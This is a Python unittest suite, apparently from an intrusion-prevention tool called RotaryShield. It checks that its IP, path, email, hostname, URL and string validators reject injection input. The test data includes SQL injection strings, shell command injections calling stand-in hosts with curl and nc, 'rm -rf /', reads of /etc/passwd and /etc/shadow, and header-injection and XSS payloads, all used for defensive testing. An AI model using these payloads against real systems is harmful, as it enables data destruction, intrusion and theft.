#!/usr/bin/env python3
"""
Security Tests for Injection Attack Prevention
Tests for RotaryShield protection against various injection attacks.

This test suite validates:
- SQL injection prevention in database operations
- Command injection prevention in system calls
- Path traversal attack prevention in file operations
- Log injection attack prevention
- Configuration injection prevention
"""

import unittest
import os
import sys
import tempfile
import sqlite3
from unittest.mock import patch, MagicMock
sys.path.insert(0, os.path.join(os.path.dirname(__file__), '../../src'))

from rotaryshield.utils.validators import (
    validate_file_path, 
    sanitize_string, 
    sanitize_filename,
    validate_ip_address,
    validate_email,
    validate_hostname,
    validate_url
)


class TestSQLInjectionPrevention(unittest.TestCase):
    """Test SQL injection prevention in database operations."""
    
    def setUp(self):
        """Set up test database."""
        self.temp_db = tempfile.NamedTemporaryFile(delete=False, suffix='.db')
        self.temp_db.close()
        self.db_path = self.temp_db.name
        
        # Create test database
        self.conn = sqlite3.connect(self.db_path)
        self.conn.execute('''
            CREATE TABLE banned_ips (
                id INTEGER PRIMARY KEY,
                ip_address TEXT NOT NULL,
                ban_time INTEGER NOT NULL,
                reason TEXT
            )
        ''')
        self.conn.commit()
    
    def tearDown(self):
        """Clean up test database."""
        self.conn.close()
        os.unlink(self.db_path)
    
    def test_sql_injection_in_ip_queries(self):
        """Test SQL injection prevention in IP address queries."""
        # Simulate IP manager operations with malicious input
        malicious_ips = [
            "192.168.1.1'; DROP TABLE banned_ips; --",
            "192.168.1.1' UNION SELECT * FROM sqlite_master --",
            "'; DELETE FROM banned_ips WHERE 1=1; --",
            "192.168.1.1' OR '1'='1",
            "192.168.1.1'; INSERT INTO banned_ips VALUES (999, 'evil', 0, 'hack'); --",
        ]
        
        for malicious_ip in malicious_ips:
            with self.subTest(ip=malicious_ip):
                # First validate the IP (should fail)
                is_valid, error, ip_obj = validate_ip_address(malicious_ip)
                self.assertFalse(is_valid, f"Malicious IP should be rejected: {malicious_ip}")
                
                # If somehow it passed validation, test database query
                if is_valid:
                    # This simulates what the IP manager would do
                    try:
                        # Using parameterized query (safe)
                        cursor = self.conn.execute(
                            "SELECT * FROM banned_ips WHERE ip_address = ?", 
                            (malicious_ip,)
                        )
                        results = cursor.fetchall()
                        # Should not cause injection
                        self.assertIsInstance(results, list)
                    except Exception as e:
                        self.fail(f"Parameterized query should not fail: {e}")
    
    def test_reason_field_injection(self):
        """Test SQL injection prevention in reason field."""
        malicious_reasons = [
            "SSH brute force'; DROP TABLE banned_ips; --",
            "SSH brute force' UNION SELECT password FROM users --",
            "'; DELETE FROM banned_ips; SELECT 'hack",
        ]
        
        valid_ip = "192.168.1.100"
        
        for malicious_reason in malicious_reasons:
            with self.subTest(reason=malicious_reason):
                # Sanitize reason field
                sanitized_reason = sanitize_string(malicious_reason, max_length=200)
                
                # Should not contain SQL injection patterns
                self.assertNotIn("DROP", sanitized_reason.upper())
                self.assertNotIn("DELETE", sanitized_reason.upper())
                self.assertNotIn("UNION", sanitized_reason.upper())
                self.assertNotIn("--", sanitized_reason)
                
                # Test database insertion with sanitized data
                try:
                    self.conn.execute(
                        "INSERT INTO banned_ips (ip_address, ban_time, reason) VALUES (?, ?, ?)",
                        (valid_ip, int(time.time()), sanitized_reason)
                    )
                    self.conn.commit()
                    
                    # Verify data was inserted correctly
                    cursor = self.conn.execute(
                        "SELECT reason FROM banned_ips WHERE ip_address = ?", 
                        (valid_ip,)
                    )
                    result = cursor.fetchone()
                    self.assertIsNotNone(result)
                    
                    # Clean up for next test
                    self.conn.execute("DELETE FROM banned_ips WHERE ip_address = ?", (valid_ip,))
                    self.conn.commit()
                    
                except Exception as e:
                    self.fail(f"Safe database operation should not fail: {e}")


class TestCommandInjectionPrevention(unittest.TestCase):
    """Test command injection prevention in system calls."""
    
    def test_ip_address_command_injection(self):
        """Test command injection prevention in IP addresses used in system commands."""
        malicious_ips = [
            "192.168.1.1; rm -rf /",
            "192.168.1.1 && curl evil.com",
            "192.168.1.1 | nc evil.com 1234",
            "192.168.1.1`rm -rf /`",
            "192.168.1.1$(rm -rf /)",
            "192.168.1.1; cat /etc/passwd",
            "'; DROP TABLE users; --",
        ]
        
        for malicious_ip in malicious_ips:
            with self.subTest(ip=malicious_ip):
                # IP validation should reject these
                is_valid, error, ip_obj = validate_ip_address(malicious_ip)
                self.assertFalse(is_valid, f"Malicious IP should be rejected: {malicious_ip}")
                
                # Even if somehow it passed, sanitization should clean it
                sanitized = sanitize_string(malicious_ip, allow_special_chars=False)
                
                # Should not contain command injection characters
                dangerous_chars = [';', '&', '|', '`', '$', '(', ')', '<', '>']
                for char in dangerous_chars:
                    self.assertNotIn(char, sanitized, f"Sanitized string should not contain '{char}'")
    
    def test_filename_command_injection(self):
        """Test command injection prevention in filenames."""
        malicious_filenames = [
            "log.txt; rm -rf /",
            "log.txt && curl evil.com",
            "log.txt | nc attacker.com 1234",
            "log.txt`id`",
            "log.txt$(whoami)",
            "; cat /etc/passwd; #.txt",
            "../../../etc/passwd",
        ]
        
        for malicious_filename in malicious_filenames:
            with self.subTest(filename=malicious_filename):
                sanitized = sanitize_filename(malicious_filename)
                
                # Should not contain command injection characters
                dangerous_chars = [';', '&', '|', '`', '$', '(', ')', '<', '>', '/', '\\']
                for char in dangerous_chars:
                    self.assertNotIn(char, sanitized, f"Sanitized filename should not contain '{char}'")
                
                # Should not be empty
                self.assertNotEqual(sanitized, "")
                
                # Should not contain path traversal
                self.assertNotIn("..", sanitized)


class TestPathTraversalPrevention(unittest.TestCase):
    """Test path traversal attack prevention."""
    
    def test_basic_path_traversal_attacks(self):
        """Test prevention of basic path traversal attacks."""
        malicious_paths = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "/var/log/../../../etc/shadow",
            "log.txt/../../../etc/passwd",
            "....//....//....//etc/passwd",
            "/var/log/../../bin/sh",
        ]
        
        for malicious_path in malicious_paths:
            with self.subTest(path=malicious_path):
                is_valid, error, normalized = validate_file_path(malicious_path)
                self.assertFalse(is_valid, f"Path traversal should be detected: {malicious_path}")
                self.assertIn("traversal", error.lower())
                self.assertIsNone(normalized)
    
    def test_url_encoded_path_traversal(self):
        """Test prevention of URL-encoded path traversal attacks."""
        encoded_attacks = [
            # URL encoded ../ patterns
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "%2e%2e%5c%2e%2e%5c%2e%2e%5cwindows%5csystem32",
            "/var/log/%2e%2e/%2e%2e/etc/passwd",
            
            # Double URL encoding
            "%252e%252e%252f%252e%252e%252f",
            
            # Mixed encoding
            "../%2e%2e/etc/passwd",
            "..%2f..%2fetc%2fpasswd",
        ]
        
        for encoded_attack in encoded_attacks:
            with self.subTest(path=encoded_attack):
                is_valid, error, normalized = validate_file_path(encoded_attack)
                self.assertFalse(is_valid, f"Encoded path traversal should be detected: {encoded_attack}")
                self.assertIn("traversal", error.lower())
    
    def test_allowed_directories_bypass(self):
        """Test that allowed directories cannot be bypassed."""
        allowed_dirs = ["/var/log", "/opt/rotaryshield"]
        
        bypass_attempts = [
            "/var/log/../etc/passwd",
            "/var/log/../../etc/shadow",
            "/opt/rotaryshield/../../../etc/passwd",
            "/var/log/subdir/../../etc/passwd",
        ]
        
        for bypass_attempt in bypass_attempts:
            with self.subTest(path=bypass_attempt):
                is_valid, error, normalized = validate_file_path(bypass_attempt, allowed_dirs)
                self.assertFalse(is_valid, f"Directory bypass should be prevented: {bypass_attempt}")
    
    def test_null_byte_injection(self):
        """Test prevention of null byte injection in paths."""
        null_byte_attacks = [
            "/var/log/auth.log\x00../../etc/passwd",
            "/var/log/auth.log\x00",
            "normal_file.txt\x00.php",
            "/etc/passwd\x00.jpg",
        ]
        
        for attack in null_byte_attacks:
            with self.subTest(path=attack):
                is_valid, error, normalized = validate_file_path(attack)
                self.assertFalse(is_valid, f"Null byte injection should be detected: {repr(attack)}")


class TestLogInjectionPrevention(unittest.TestCase):
    """Test log injection attack prevention."""
    
    def test_log_line_sanitization(self):
        """Test sanitization of log lines to prevent injection."""
        malicious_logs = [
            # ANSI escape sequence injection
            "Failed login\x1b[2J\x1b[H\x1b[31mHACKED\x1b[0m",
            
            # Null byte injection
            "Failed login\x00INJECTED DATA",
            
            # Control character injection
            "Failed login\x01\x02\x03EVIL",
            
            # Newline injection for log forgery
            "Failed login\nSUCCESSFUL LOGIN admin",
            
            # Carriage return injection
            "Failed login\rSUCCESSFUL LOGIN admin",
            
            # Tab injection
            "Failed login\tEVIL\tDATA",
        ]
        
        for malicious_log in malicious_logs:
            with self.subTest(log=repr(malicious_log)):
                sanitized = sanitize_string(malicious_log, allow_newlines=False)
                
                # Should not contain control characters
                for i in range(32):
                    if i not in [9, 10, 13]:  # Allow tab, LF, CR for some contexts
                        self.assertNotIn(chr(i), sanitized, f"Should not contain control char {i}")
                
                # Should not contain ANSI escape sequences
                self.assertNotIn('\x1b', sanitized)
                
                # Should not be empty (unless original was empty)
                if malicious_log.strip():
                    self.assertNotEqual(sanitized.strip(), "")
    
    def test_log_forging_prevention(self):
        """Test prevention of log forging attacks."""
        forging_attempts = [
            # Try to create fake successful login
            "192.168.1.100\nSUCCESSFUL LOGIN for admin from 192.168.1.100",
            
            # Try to inject fake timestamp
            "192.168.1.100\n[2024-01-01 00:00:00] SYSTEM COMPROMISED",
            
            # Try to clear log entries
            "192.168.1.100\x1b[2J\x1b[HCleared all logs",
        ]
        
        for attempt in forging_attempts:
            with self.subTest(attempt=repr(attempt)):
                sanitized = sanitize_string(attempt, allow_newlines=False, max_length=1000)
                
                # Should not contain newlines if not allowed
                self.assertNotIn('\n', sanitized)
                self.assertNotIn('\r', sanitized)
                
                # Should not contain ANSI escape sequences
                self.assertNotIn('\x1b', sanitized)


class TestConfigurationInjectionPrevention(unittest.TestCase):
    """Test configuration injection prevention."""
    
    def test_email_injection_prevention(self):
        """Test email injection prevention in notification settings."""
        malicious_emails = [
            # SMTP header injection
            "admin@domain.com\nBcc: attacker@evil.com",
            "admin@domain.com\rBcc: attacker@evil.com",
            "admin@domain.com\n\nEVIL EMAIL BODY",
            
            # Try to break email parsing
            "admin@domain.com'; DROP TABLE users; --",
            "admin@domain.com<script>alert('xss')</script>",
        ]
        
        for malicious_email in malicious_emails:
            with self.subTest(email=malicious_email):
                is_valid, error = validate_email(malicious_email)
                self.assertFalse(is_valid, f"Malicious email should be rejected: {malicious_email}")
    
    def test_hostname_injection_prevention(self):
        """Test hostname injection prevention in configuration."""
        malicious_hostnames = [
            # Try to inject commands
            "example.com; rm -rf /",
            "example.com && curl evil.com",
            
            # Try to break DNS parsing
            "example.com\n\nevil.com",
            "example.com\x00evil.com",
            
            # Overlong labels
            "a" * 64 + ".com",
            
            # Invalid characters
            "exam_ple.com",
            "example..com",
        ]
        
        for malicious_hostname in malicious_hostnames:
            with self.subTest(hostname=malicious_hostname):
                is_valid, error = validate_hostname(malicious_hostname)
                self.assertFalse(is_valid, f"Malicious hostname should be rejected: {malicious_hostname}")
    
    def test_url_injection_prevention(self):
        """Test URL injection prevention in configuration."""
        malicious_urls = [
            # JavaScript injection
            "javascript:alert('xss')",
            "javascript://comment%0aalert('xss')",
            
            # Data URL injection
            "data:text/html,<script>alert('xss')</script>",
            
            # File URL attempts
            "file:///etc/passwd",
            "file:///../../../etc/passwd",
            
            # Protocol confusion
            "http://example.com\n\nhttp://evil.com",
            "http://example.com\x00http://evil.com",
        ]
        
        for malicious_url in malicious_urls:
            with self.subTest(url=malicious_url):
                is_valid, error = validate_url(malicious_url)
                self.assertFalse(is_valid, f"Malicious URL should be rejected: {malicious_url}")


class TestInputSanitizationComprehensive(unittest.TestCase):
    """Comprehensive input sanitization tests."""
    
    def test_unicode_normalization_attacks(self):
        """Test Unicode normalization attack prevention."""
        unicode_attacks = [
            # Homograph attacks
            "аdmin",  # Cyrillic 'а' instead of Latin 'a'
            "admin\u200d",  # Zero-width joiner
            "admin\u200c",  # Zero-width non-joiner
            
            # Normalization bypass
            "café",  # Normal
            "cafe\u0301",  # With combining accent
            
            # Overlong UTF-8
            "test\uFEFF",  # Byte order mark
        ]
        
        for attack in unicode_attacks:
            with self.subTest(attack=repr(attack)):
                sanitized = sanitize_string(attack)
                
                # Should handle Unicode properly without crashing
                self.assertIsInstance(sanitized, str)
                
                # Should not contain problematic characters
                self.assertNotIn('\u200d', sanitized)  # Zero-width joiner
                self.assertNotIn('\u200c', sanitized)  # Zero-width non-joiner
                self.assertNotIn('\uFEFF', sanitized)  # BOM
    
    def test_buffer_overflow_prevention(self):
        """Test buffer overflow prevention in string handling."""
        # Test with very long strings
        long_strings = [
            "A" * 10000,
            "test " * 5000,
            "\x00" * 1000,
        ]
        
        for long_string in long_strings:
            with self.subTest(length=len(long_string)):
                sanitized = sanitize_string(long_string, max_length=1000)
                
                # Should be truncated
                self.assertLessEqual(len(sanitized), 1003)  # 1000 + "..."
                
                # Should not cause memory issues
                self.assertIsInstance(sanitized, str)
    
    def test_format_string_attacks(self):
        """Test format string attack prevention."""
        format_attacks = [
            "%s%s%s%s%s",
            "{0}{1}{2}",
            "%(password)s",
            "%x%x%x%x",
        ]
        
        for attack in format_attacks:
            with self.subTest(attack=attack):
                sanitized = sanitize_string(attack)
                
                # Should not cause format string vulnerabilities
                # The sanitized string should still contain the characters
                # but they shouldn't be interpreted as format specifiers
                self.assertIsInstance(sanitized, str)
                
                # Test that it doesn't crash when used in string operations
                try:
                    result = f"Input: {sanitized}"
                    self.assertIsInstance(result, str)
                except Exception as e:
                    self.fail(f"Sanitized string caused format error: {e}")


if __name__ == '__main__':
    # Add missing import
    import time
    unittest.main()